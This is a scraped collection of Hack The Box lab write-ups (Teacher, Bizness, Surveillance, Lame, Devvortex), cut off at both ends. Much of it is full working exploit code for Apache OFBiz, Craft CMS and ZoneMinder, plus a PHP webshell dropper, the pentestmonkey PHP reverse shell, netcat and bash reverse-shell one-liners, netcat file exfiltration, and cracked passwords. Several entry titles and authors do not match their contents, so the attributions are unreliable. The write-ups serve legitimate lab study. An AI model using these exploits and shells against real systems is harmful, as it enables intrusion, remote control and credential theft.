/home/giovanni/work/tmp and changing the permissions to 777.\ngiovanni@teacher:/var/www/html/moodle/question$ cat /usr/bin/backup.sh#!/bin/bashcd /home/giovanni/work;tar -czvf tmp/backup_courses.tar.gz courses/*;cd tmp;tar -xf backup_courses.tar.gz;chmod 777 * -R;\nYou may have to forgive me here as I’ve reached the end of my tether. I had to restart the box about 5 times due to it crashing repeatedly. All I did was create a symbolic link from courses to /root. That way, when the script runs, the contents of the root directory will be backed up to work/tmp/courses which will allow me to capture the root flag.\ngiovanni@teacher:~/work$ ln -s /root coursesgiovanni@teacher:~/work$ ls -laSh coursesgiovanni@teacher:~/work$ lscourses  courses.bak  tmpgiovanni@teacher:~/work$ cd tmpgiovanni@teacher:~/work/tmp$ lsbackup_courses.tar.gz  coursesgiovanni@teacher:~/work/tmp$ cd coursesgiovanni@teacher:~/work/tmp/courses$ lsalgebra  root.txtgiovanni@teacher:~/work/tmp/courses$ cat root.txtcat root.txt63d▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓3cc\nTeacher Learnings\nIronically, I didn’t learn a lot from the teacher box. The Moodle exploit was interesting as I hadn’t done it before but that was about it. Unfortunately, I have to say that this is one of my least favorite boxes that I’ve completed so far. The concept is nice but the box was too flakey, well for me it was anyway. It seemed that the slightest mistake in syntax caused the box to throw a tantrum. This is on a private VIP box too so not like other people were hitting it.\nI think enabling SSH would have made the box more tolerable as it would have allowed quick access to the user. I wouldn’t want this on every box but having to repeat the Moodle exploit every time the box decided to stop responding made me want to quit. Also what was up with the credentials hidden in the image… Oh well, it’s done now and I can put it behind me. Glad I did it but didn’t enjoy it. Thanks for the box!"
    },
    {
        "title": "Hack The Box (Surveillance) | by Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-surveillance-5a0c8f716e53",
        "content": "import argparseimport loggingimport osimport subprocessimport base64import requestsimport urllib3# Disable SSL verification warning for simplicityurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)def validate_url(url):    \"\"\"    Validate the URL schema.    \"\"\"    if not url.startswith(\"http://\") and not url.startswith(\"https://\"):        raise ValueError(\"Invalid URL schema. Use 'http://' or 'https://'.\")def scan(url):    \"\"\"    Perform a basic scan on the specified URL.    \"\"\"    print(\"[+] Scanning started...\")    try:        target_url = f\"{url}/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y\"        response = requests.get(target_url, verify=False)        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)        if \"PONG\" in response.text:            print(\"[+] Apache OFBiz instance seems to be vulnerable.\")        else:            print(\"[-] Apache OFBiz instance seems NOT to be vulnerable.\")    except requests.exceptions.RequestException as e:        print(f\"[-] LOG: An error occurred during the scan: {e}\")def get_encoded_payload(cmd):    \"\"\"    Generate an encoded payload based on the provided command.    \"\"\"    if not os.path.isfile(\"ysoserial-all.jar\"):        logging.error(\"[-] ysoserial-all.jar not found. Exiting.\")        exit(1)    print(\"[+] Generating payload...\")    try:        #print(f\"[+] Running the following command: {cmd}\")        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, text=False)        encoded_output = base64.b64encode(result.stdout).decode().replace(\"\\n\", \"\")        print(\"[+] Payload generated successfully.\")    except subprocess.CalledProcessError as e:        print(f\"[-] LOG: An error occurred during payload generation: {e}\")    return encoded_outputdef send_post_request(url, encoded_output):    \"\"\"    Send a POST request with a malicious serialized payload.    \"\"\"    print(\"[+] Sending malicious serialized payload...\")    try:        target_url = f\"{url}/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y\"        headers = {            \"Content-Type\": \"application/xml\",        }        xml_data = f\"\"\"<?xml version=\"1.0\"?>            <methodCall>              <methodName>Methodname</methodName>              <params>                <param>                  <value>                    <struct>                      <member>                        <name>test</name>                        <value>                          <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">{encoded_output}</serializable>                        </value>                      </member>                    </struct>                  </value>                </param>              </params>            </methodCall>        \"\"\"        response = requests.post(target_url, headers=headers, data=xml_data, verify=False)        if response.status_code == 200:            print(\"[+] The request has been successfully sent. Check the result of the command.\")        else:            print(\"[-] Failed to send the request. Check the connection or try again.\")    except requests.exceptions.RequestException as e:        print(f\"[-] LOG: An error occurred during the scan: {e}\")def main():    \"\"\"    Main function for executing the script.    \"\"\"    parser = argparse.ArgumentParser(description=\"Exploit script for Apache EFBiz auth vulnerability (CVE-2023-49070 and CVE-2023-51467).\")    parser.add_argument(\"--url\", required=True, help=\"EFBIZ's URL to send requests to.\")    parser.add_argument(\"--cmd\", help=\"Command to run on the remote server. Optional.\")    args = parser.parse_args()    url = args.url.rstrip('/')    validate_url(args.url)    if args.cmd is None:        scan(url)    else:        command = f\"java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsBeanutils1 '{args.cmd}'\"        encoded_output = get_encoded_payload(command)        send_post_request(url, encoded_output)if __name__ == \"__main__\":    main()\nAnalyzing the python script here is a breakdown of what its doing:\n* Import necessary libraries: The script imports several Python libraries, including argparse for command-line argument parsing, logging for logging messages, os for interacting with the operating system, subprocess for running external commands, base64 for encoding and decoding data in Base64 format, requests for making HTTP requests, and urllib3 to disable SSL verification warnings.\n* Define a function validate_url(url) to check the URL schema: This function is used to ensure that the provided URL starts with either “http://” or “https://.\" If the URL does not match this format, it raises a ValueError.\n* Define a function scan(url) to perform a basic scan: This function constructs a target URL based on the provided URL and sends an HTTP GET request to it. It looks for the presence of “PONG” in the response text, indicating a vulnerability in the Apache OFBiz instance. If “PONG” is found, it prints that the instance seems to be vulnerable; otherwise, it prints that it’s not vulnerable.\n* Define a function get_encoded_payload(cmd) to generate an encoded payload: This function generates an encoded payload based on a provided command. It checks if the ysoserial-all.jar file exists and then runs the provided command using subprocess.run. It encodes the command’s output in Base64 format and returns the encoded payload as a string.\n* Define a function send_post_request(url, encoded_output) to send a POST request: This function constructs an XML-RPC POST request with a malicious serialized payload and sends it to a target URL. It sets the Content-Type header to “application/xml” and includes the encoded payload in the XML data. It checks the HTTP response status code to determine whether the request was successful.\n* Define the main() function: This is the main entry point of the script. It uses argparse to parse command-line arguments, including the target URL ( — url) and an optional command ( — cmd) to execute on the remote server. It validates the URL, and if no command is provided, it calls the scan() function to check for the Apache OFBiz vulnerability. If a command is provided, it generates the payload and sends the malicious request.\n* Execute the script if it’s the main module: The script checks if it’s being run as the main module (not imported as a library) and calls the main() function to start the execution.\nSince the script is allowing commands to be executed on the server I set up a netcat listener on my machine and when running the exploit I specified the netcat command to call back to my machine:\nOn my attack machine:\nIn another terminal window in the directory where the exploit resides:\npython3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/sh <your ip here> 4444'\nI got a shell as user ofbiz hell yeah! This shell sucked so I ran the following command to upgrade it to a more stable one:\n/usr/bin/script -qc /bin/bash /dev/null\nGetting root was hard for me. I ran to Linpeas and didn’t see anything that could lead me to finding privesc. I had to peek through files on the system to see if I could find a hash or password because I did notice that the Derby database was being used, so I went to the directory path where it was storing its .dat files.\nI ran this command to narrow down which files had “SHA” in them for a hash:\nThe file c54d0.dat had the hash I was looking for..\nfind /opt/ofbiz/runtime/data/derby/ofbiz/seg0 -type f -name “*.dat” -exec grep “SHA” {} \\;\nThe file c54d0.dat ended up having the hash I was looking for after some trial an error.\nThe next step is cracking the hash to obtain a password. I chopped the beginning strings of the hash “$SHA$d$” and converted them using Cyberchef; that way, I could run hashcat against it."
    },
    {
        "title": "Keep Calm and Hack The Box — Lame | by Sonya Moisset",
        "link": "https://medium.com/sonyamoisset/keep-calm-and-hack-the-box-lame-b36f818bdf32",
        "content": "I’ve been on the Hack The Box platform for many years now and It sharpens my hacking skills. This machine was one of my favorites to hack. It was a Medium level machine and I am proud of myself for owning it. The machine goes over a heavy enumeration that leads to exploiting Craft CMSto get a low-level shell on the server. Privilege escalation was performed by doing a local port-forward with ssh exploiting ZoneMinder.\nThey are always watching you…\nEnumeration:\nI blastedautoreconat the IP and got back only two ports which was sweet. I served up all of my scan results from autorecon to my Python local HTTP server. This helps me stay organized when viewing my results in a web browser.\nsudo $(which autorecon) <Target IP Here>\nIn another terminal window while autorecon is running:\npython -m http.server 80\nNmap Results:\nNmap scan report for 10.10.11.245Host is up, received user-set (0.076s latency).Scanned at 2024-02-13 15:51:45 PST for 72sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE REASON         VERSION22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://surveillance.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS\nVisiting the IP in Firefox It was trying to communicate with the domain surveillance.htb. I mapped the domain to the machine's IP in the/etc/hosts file.\nsudo nano /etc/hosts\nRevisiting the IP back in my browser resolved it to the domain and was able to access the page.\nThe company offers Cameras, Intrusion, Perimeter Security, Access Control & Intercom services.\nThe first thing I always do when navigating a web page is analyze it by hitting ctrl-u on my keyboard for the“View Page Source” functionality in Firefox. I had the wappalyzerextension installed also so this gave me some info on what technologies the server was using.\nI did a keyword search in the view page source ctrl-f for “CMS” and came across some version information.\nExploitation:\nDoing some googling of the version I found an exploit on Github that this person spoiled for us since it's related to this machine.\nThanks anyway dude 😏.\n#!/usr/bin/env python3#coding: utf-8# Exploit Title: Craft CMS unauthenticated Remote Code Execution (RCE)# Date: 2023-12-26# Version: 4.0.0-RC1 - 4.4.14# Vendor Homepage: https://craftcms.com/# Software Link: https://github.com/craftcms/cms/releases/tag/4.4.14# Tested on: Ubuntu 22.04.3 LTS# Tested on: Craft CMS 4.4.14# Exploit Author: Olivier Lasne# CVE : CVE-2023-41892# References :# https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g# https://blog.calif.io/p/craftcms-rceimport requestsimport sys, reif(len(sys.argv) < 2):    print(f\"\\033[1;96mUsage:\\033[0m python {sys.argv[0]} \\033[1;96m<url>\\033[0m\")    exit()HOST = sys.argv[1]if not re.match('^https?://.*', HOST):    print(\"\\033[1;31m[-]\\033[0m URL should start with http or https\")    exit()print(\"\\033[1;96m[+]\\033[0m Executing phpinfo to extract some config infos\")## Execute phpinfo() and extract config info from the websiteurl = HOST + '/index.php'content_type = {'Content-Type': 'application/x-www-form-urlencoded'}data = r'action=conditions/render&test[userCondition]=craft\\elements\\conditions\\users\\UserCondition&config={\"name\":\"test[userCondition]\",\"as xyz\":{\"class\":\"\\\\GuzzleHttp\\\\Psr7\\\\FnStream\",\"__construct()\":[{\"close\":null}],\"_fn_close\":\"phpinfo\"}}'try:    r = requests.post(url, headers=content_type, data=data)except:    print(f\"\\033[1;31m[-]\\033[0m Could not connect to {HOST}\")    exit()# If we succeed, we should have default phpinfo credits if not 'PHP Group' in r.text: print(f'\\033[1;31m[-]\\033[0m {HOST} is not exploitable.') exit()# Extract config value for tmp_dir and document_rootpattern1 = r'<tr><td class=\"e\">upload_tmp_dir<\\/td><td class=\"v\">(.*?)<\\/td><td class=\"v\">(.*?)<\\/td><\\/tr>'pattern2 = r'<tr><td class=\"e\">\\$_SERVER\\[\\'DOCUMENT_ROOT\\'\\]<\\/td><td class=\"v\">([^<]+)<\\/td><\\/tr>'tmp_dir       = re.search(pattern1, r.text, re.DOTALL).group(1)document_root = re.search(pattern2, r.text, re.DOTALL).group(1)if 'no value' in tmp_dir: tmp_dir = '/tmp'print(f'temporary directory: {tmp_dir}')print(f'web server root: {document_root}')## Create shell.php in tmp_dirdata = {    \"action\": \"conditions/render\",    \"configObject[class]\": \"craft\\elements\\conditions\\ElementCondition\",    \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"msl:/etc/passwd\"}}}'}files = {    \"image1\": (\"pwn1.msl\", \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>    <image>    <read filename=\"caption:<?php @system(@$_REQUEST['cmd']); ?>\"/>    <write filename=\"info:DOCUMENTROOT/shell.php\"/>    </image>\"\"\".replace(\"DOCUMENTROOT\", document_root), \"text/plain\")}print(f'\\033[1;96m[+]\\033[0m create shell.php in {tmp_dir}')r = requests.post(url, data=data, files=files) #, proxies={'http' : 'http://127.0.0.1:8080'}) #  # Use the Imagick trick to move the webshell in DOCUMENT_ROOTdata = {    \"action\": \"conditions/render\",    \"configObject[class]\": r\"craft\\elements\\conditions\\ElementCondition\",    \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"vid:msl:' + tmp_dir + r'/php*\"}}}'}print(f'\\033[1;96m[+]\\033[0m trick imagick to move shell.php in {document_root}')r = requests.post(url, data=data) #, proxies={\"http\": \"http://127.0.0.1:8080\"})if r.status_code != 502:    print(\"\\033[1;31m[-]\\033[0m Exploit failed\")    exit()print(f\"\\n\\033[1;95m[+]\\033[0m Webshell is deployed: {HOST}/\\033[1mshell.php\\033[0m?cmd=whoami\")print(f\"\\033[1;95m[+]\\033[0m Remember to \\033[1mdelete shell.php\\033[0m in \\033[1m{document_root}\\033[0m when you're done\\n\")print(\"\\033[1;92m[!]\\033[0m Enjoy your shell\\n\")url = HOST + '/shell.php'## Pseudo Shellwhile True:    command = input('\\033[1;96m>\\033[0m ')    if command == 'exit':        exit()    if command == 'clear' or command == 'cls':        print('\\n' * 100)        print('\\033[H\\033[3J', end='')        continue    data = {'cmd' : command}    r = requests.post(url, data=data) #, proxies={\"http\": \"http://127.0.0.1:8080\"})    # exit if we have an error    if r.status_code != 200:        print(f\"Error: status code {r.status_code} for {url}\")        exit()    res_command = r.text    res_command = re.sub('^caption:', '', res_command)    res_command = re.sub(' CAPTION.*$', '', res_command)    print(res_command, end='')\nOkay let's at least do a breakdown of what this exploit code is doing:\nThis Python script is an exploit for a vulnerability (CVE-2023–41892) in Craft CMS, versions 4.0.0-RC1 through 4.4.14, which allows unauthenticated remote code execution (RCE).\n* Usage Check: The script checks if it has been provided with the required command-line argument (the URL of the vulnerable Craft CMS instance).\n* Execute PHPInfo: Sends a request to the target Craft CMS instance to execute phpinfo() and extract configuration information.\n* Extract Configuration: Parses the response from phpinfo() to extract values for upload_tmp_dir and $_SERVER[‘DOCUMENT_ROOT’].\n* Create Shell: Constructs a malicious PHP file (shell.php) with code that allows command execution on the server.\n* Upload Shell: Uploads the malicious PHP file to the target server using a crafted request. It uses an Imagick trick to move the shell to the document root.\n* Interactive Shell: Once the shell is deployed, the script enters an interactive mode where it allows the user to execute commands on the target system through the uploaded shell.\n* Clean-Up: Provides instructions on how to delete the uploaded shell after use.\nsudo git clone https://github.com/Faelian/CraftCMS_CVE-2023-41892cd CraftCMS_CVE-2023-41892python3 craft-cms.py http://surveillance.htb/\nThe shell that was given to me was absolutely trash so I decided to run another reverse shell back to my machine.\nOn my attack machine:\nnc -nlvp 1234\nOn the target machine:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your IP here> 1234 >/tmp/f/usr/bin/script -qc /bin/bash /dev/null\nPost-Exploitation:\nThe next step for me since I was only www-data, wasto enumerate the system for password files, etc. I pushed linpeas onto the machine and found some juicy stuff that led me to an insane amount of rabbit holes.\nSorry, Alice sometimes it be like that.\nI took note of the passwords discovered and connected to the MySQL databases found password hashes tried to break them and got nothing…\nLooking back at my Linpeas results I found this interesting file:\nvar/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip\nI pushed the file onto my machine so I could analyze it further.\nOn my attack machine:\nnc -l -p <port>  > surveillance--2023-10-17-202801--v4.4.14.sql.zip\nOn the target machine:\nnc <attackers ip> <port> < surveillance--2023-10-17-202801--v4.4.14.sql.zip\nOpened the file with gedit and did a ctr-f related to users that I found on the system or passwords and came across a hash for Matthew.\nRan a hash-identifier to discover what type of hash I was working with and it was SHA-256.\nThrew the hash into a file ran Johnny Boy the Ripper on it and then sshd onto the machine.\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256\nNice password Matthew you nerd!\nusername: matthewpassword: starcraft122490\nsudo ssh -oHostKeyAlgorithms=+ssh-dss matthew@10.10.11.245\nI ran linpeas again and revisited the section where it highlighted open active ports and port 8080 was interesting to me.\nTo access this port I needed to do an SSH Local Port Forward. A local Port redirects traffic from a local port on the client machine to a specified port on a remote server through an SSH connection.\nOn my attack machine I ran:\nssh -L 2222:127.0.0.1:8080 matthew@10.10.11.245\nVisited my localhost IP in a browser on port 2222 and was presented with a ZoneMinder login page.\nLike any great hacker would do next I googled for any exploits out there available for ZoneMinder and came across yet another RCE-related exploit.\nsudo git clone https://github.com/rvizx/CVE-2023-26035cd CVE-2023-26035nc -nlvp 7777python3 exploit.py -t http://127.0.0.1:2222/ -i <your Attacker IP here> -p 7777\nLet’s break down this exploit code also:\nimport reimport requestsfrom bs4 import BeautifulSoupimport argparseimport base64# CVE-2023-26035 - Unauthenticated RCE in ZoneMinder Snapshots# Author : Ravindu Wickramasinghe | rvz (@RVIZX9)class ZoneMinderExploit:    def __init__(self, target_uri):        self.target_uri = target_uri        self.csrf_magic = None    def fetch_csrf_token(self):        print(\"[>] fetching csrt token\")        response = requests.get(self.target_uri)        self.csrf_magic = self.get_csrf_magic(response)        if response.status_code == 200 and re.match(r'^key:[a-f0-9]{40},\\d+', self.csrf_magic):            print(f\"[>] recieved the token: {self.csrf_magic}\")            return True        print(\"[!] unable to fetch or parse token.\")        return False    def get_csrf_magic(self, response):        return BeautifulSoup(response.text, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value', None)    def execute_command(self, cmd):        print(\"[>] sending payload..\")        data = {'view': 'snapshot', 'action': 'create', 'monitor_ids[0][Id]': f';{cmd}', '__csrf_magic': self.csrf_magic}        response = requests.post(f\"{self.target_uri}/index.php\", data=data)        print(\"[>] payload sent\" if response.status_code == 200 else \"[!] failed to send payload\")    def exploit(self, payload):        if self.fetch_csrf_token():            print(f\"[>] executing...\")            self.execute_command(payload)if __name__ == \"__main__\":    parser = argparse.ArgumentParser()    parser.add_argument('-t', '--target-url', required=True, help='target url endpoint')    parser.add_argument('-ip', '--local-ip', required=True, help='local ip')    parser.add_argument('-p', '--port', required=True, help='port')    args = parser.parse_args()    # generating the payload    ps1 = f\"bash -i >& /dev/tcp/{args.local_ip}/{args.port} 0>&1\"      ps2 = base64.b64encode(ps1.encode()).decode()    payload = f\"echo {ps2} | base64 -d | /bin/bash\"    ZoneMinderExploit(args.target_url).exploit(payload)\nThis Python script is an exploit for (CVE-2023–26035), which is an unauthenticated Remote Code Execution (RCE) vulnerability in ZoneMinder Snapshots.\n* The script imports necessary modules: re for regular expressions, requests for making HTTP requests, BeautifulSoup from the bs4 library for parsing HTML, argparse for parsing command-line arguments, and base64 for encoding payloads.\nZoneMinderExploit Class:\n* This class encapsulates the exploit logic:\n* The __init__ method initializes the target URI and CSRF token.\n* The fetch_csrf_token method sends a GET request to the target URI to fetch the CSRF token from the HTML response.\n* The get_csrf_magic method parses the HTML response to extract the CSRF token.\n* The execute_command method sends a POST request with a payload to execute arbitrary commands on the target.\n* The exploit method orchestrates the exploit by fetching the CSRF token and executing the payload.\nPayload Generation:\n* The script parses command-line arguments to obtain the target URL, local IP, and port.\n* It generates a payload (ps1) that establishes a reverse shell connection to the specified local IP and port using bash.\n* The payload is encoded using base64 (ps2), and a final payload is constructed to decode and execute the payload using base64 and bash.\nCommand-Line Argument Parsing:\n* The script uses argparse to parse command-line arguments, expecting the target URL, local IP, and port.\nExploit Execution:\n* The script instantiates the ZoneMinderExploit class with the target URL and calls the exploit method, passing the generated payload.\n* The exploit fetches the CSRF token and then executes the payload to establish a reverse shell on the target system.\nThe first thing I always do and I mean always is run sudo -l .\nThis had me chasing my tail for a while and had no idea how to abuse this. Eventually, I decided to look in the /usr/bin directory for all zm related scripts and found zmupdate.pl .\nDid some reverse engineering on this file and saw that the user= argument parameter was vulnerable to an injection attack. So I ran the file passed my injection to the user argument and got a shell as root!\nsudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023\nThe shell was super buggy and couldn't run anything as root so I did another reverse shell back onto my machine and got a stable shell.\nOn the target machine after running the exploit:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 3333 >/tmp/f"
    },
    {
        "title": "Hack The Box (Bizness) | by Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-bizness-60728bcde635",
        "content": "Step 1 — Scanning the network\nThe first step before exploiting a machine is to do a little bit of scanning and reconnaissance.\nThis is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on that phase to get as much information as you could.\nI will use Nmap (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.\nThere are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation here\nI use the following command to get a basic idea of what we are scanning\n-sV: Probe open ports to determine service/version info\n-O: Enable OS detection\n-F: Fast mode — Scan fewer ports than the default scan\n— version-light: Limit to most likely probes (intensity 2)\n10.10.10.3: IP address of the Lame box\nYou can also use Zenmap, which is the official Nmap Security Scanner GUI. It is a multi-platform, free and open source application which aims to make Nmap easy for beginners to use while providing advanced features for experienced Nmap users.\nI use a different set of commands to perform an intensive scan\n-A: Enable OS detection, version detection, script scanning, and traceroute\n-v: Increase verbosity level\n10.10.10.3: IP address of the Lame box\nIf you find the results a little bit too overwhelming, you can move to the Ports/Hosts tab to only get the open ports\nWe can see that there are 4 open ports:\nPort 21. File Transfer Protocol (FTP) control (command)\nPort 22. Secure Shell (SSH), secure logins, file transfers (scp, sftp) and port forwarding\nPort 139. NetBIOS Session Service\nPort 445. Microsoft-DS (Directory Services) SMB file sharing\nLet see what we can get with the first port\nStep 2 — The Vulnerable FTP\nWe will use Searchsploit to check if there’s any known vulnerability on vsftpd 2.3.4. Searchsploit is a command line search tool for Exploit Database\nI use the following command\nNow that we know that there is a vulnerability — Backdoor Command Execution — let’s try to exploit it\nWe will use Metasploit. It’s a penetration testing framework that makes hacking simple. It’s an essential tool for many attackers and defenders\nI launch Metasploit Framework on Kali and look for command I should use to launch the exploit\nI use the command to look for all the payloads available\nWe can see there are several different exploits but the one we’re interested in is number 4\nI use the following command for the exploit\nThis will launch the exploit. I use this command to display the available options\nYou can see that the remote host (RHOSTS) is not yet set. I will set both the remote host and the target as these two pieces of information are needed to run the exploit\nI use the following command to set the remote host using the IP address of HTB Lame box\nThen I set the target to 0 as displayed when I checked the options\nWe can now run the exploit\nUnfortunately we can see that even if the exploit is completed, no session was created. The vulnerability has been patched as mentioned here, in the description of the exploit.\nThis module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.\nThe Exploit Database is a Common Vulnerabilities and Exposures (CVE) compliant archive of public exploits and corresponding vulnerable software, developed for use by penetration testers and vulnerability researchers. The aim is to serve the most comprehensive collection of exploits gathered through direct submissions, mailing lists, as well as other public sources, and present them in a freely-available and easy-to-navigate database. The Exploit Database is a repository for exploits and proof-of-concepts rather than advisories, making it a valuable resource for those who need actionable data right away\nWe need to find another way. Let’s have a look at another port!\nYou can read the whole article on freeCodeCamp News website"
    },
    {
        "title": "Hack The Box (Devvortex) - Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-devvortex-9cc1ad2961b5",
        "content": "Let me give you a little breakdown of that this ruby code is doing:\n* Shebang Line: The script starts with a shebang line (#!/usr/bin/env ruby), indicating that it should be executed using the Ruby interpreter.\n* Exploit Information: The code includes comments that provide details about the exploit, such as its title, author, CVE identifier, and references to relevant websites and sources related to the vulnerability.\n* Required Libraries: The script requires several Ruby libraries, including json, httpx, docopt, and paint, which are used for various purposes, such as handling JSON data, making HTTP requests, parsing command-line arguments, and displaying colored output.\n* Docopt Usage and Options: The script defines a docopt usage section, which describes how to use the script and its command-line options. It specifies the required argument <url> and optional options like — debug, — no-color, and -h or — help.\n* Functions: The script defines several functions to perform specific tasks:\nfetch_users, parse_users, and display_users: These functions fetch and display information about Joomla! users from a given URL.fetch_config, parse_config, and display_config: These functions fetch and display configuration information about the Joomla! site.Main Execution Block: In the main part of the script, it:\n* Parses command-line arguments using docopt.Sets the display mode for colored output based on the — no-color option.Calls the functions to retrieve and display user and configuration information from the Joomla! site specified in the command-line argument.\n* Error Handling: The script includes basic error handling using begin and rescue blocks to catch and display any Docopt::Exit exceptions.\nIn summary, this Ruby script is designed to exploit a specific vulnerability in Joomla! (< 4.2.8) that allows unauthenticated users to disclose information about Joomla! users and site configuration. It retrieves and displays this information from the specified Joomla! site URL. It also provides command-line options for customization and error handling.\ngem install httpx docopt paintruby exploit.rb http://dev.devvortex.htb\nThe exploit puked out the user Lewis along with his password ;).\nDB user: lewisDB password: P4ntherg0t1n5r3c0n##\nI tried ssh with the creds and no luck so I moved on to the joomla admin interface on the web and was able to login as lewis.\nI googled authenticated attacks. I can perform on Jommla to get a shell, and reading back at the hacktricks article, you can target the templates to get a PHP reverse shell.\nUsing the pentestmonkey’s shell, I had to edit the code and add my IP address where it says “CHANGE THIS”.\n<?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey.net//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  The author accepts no liability// for damage caused by this tool.  If these terms are not acceptable to you, then// do not use this tool.//// In all other respects the GPL version 2 applies://// This program is free software; you can redistribute it and/or modify// it under the terms of the GNU General Public License version 2 as// published by the Free Software Foundation.//// This program is distributed in the hope that it will be useful,// but WITHOUT ANY WARRANTY; without even the implied warranty of// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the// GNU General Public License for more details.//// You should have received a copy of the GNU General Public License along// with this program; if not, write to the Free Software Foundation, Inc.,// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  If these terms are not acceptable to// you, then do not use this tool.//// You are encouraged to send comments, improvements or suggestions to// me at pentestmonkey@pentestmonkey.net//// Description// -----------// This script will make an outbound TCP connection to a hardcoded IP and port.// The recipient will be given a shell running as the current user (apache normally).//// Limitations// -----------// proc_open and stream_set_blocking require PHP version 4.3+, or 5+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.//// Usage// -----// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.set_time_limit (0);$VERSION = \"1.0\";$ip = '127.0.0.1';  // CHANGE THIS$port = 1234;       // CHANGE THIS$chunk_size = 1400;$write_a = null;$error_a = null;$shell = 'uname -a; w; id; /bin/sh -i';$daemon = 0;$debug = 0;//// Daemonise ourself if possible to avoid zombies later//// pcntl_fork is hardly ever available, but will allow us to daemonise// our php process and avoid zombies.  Worth a try...if (function_exists('pcntl_fork')) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) {  printit(\"ERROR: Can't fork\");  exit(1); } if ($pid) {  exit(0);  // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) {  printit(\"Error: Can't setsid()\");  exit(1); } $daemon = 1;} else { printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");}// Change to a safe directorychdir(\"/\");// Remove any umask we inheritedumask(0);//// Do the reverse shell...//// Open reverse connection$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) { printit(\"$errstr ($errno)\"); exit(1);}// Spawn shell process$descriptorspec = array(   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to);$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1);}// Set everything to non-blocking// Reason: Occsionally reads will block, even though stream_select tells us they won'tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(\"Successfully opened reverse shell to $ip:$port\");while (1) { // Check for end of TCP connection if (feof($sock)) {  printit(\"ERROR: Shell connection terminated\");  break; } // Check for end of STDOUT if (feof($pipes[1])) {  printit(\"ERROR: Shell process terminated\");  break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, 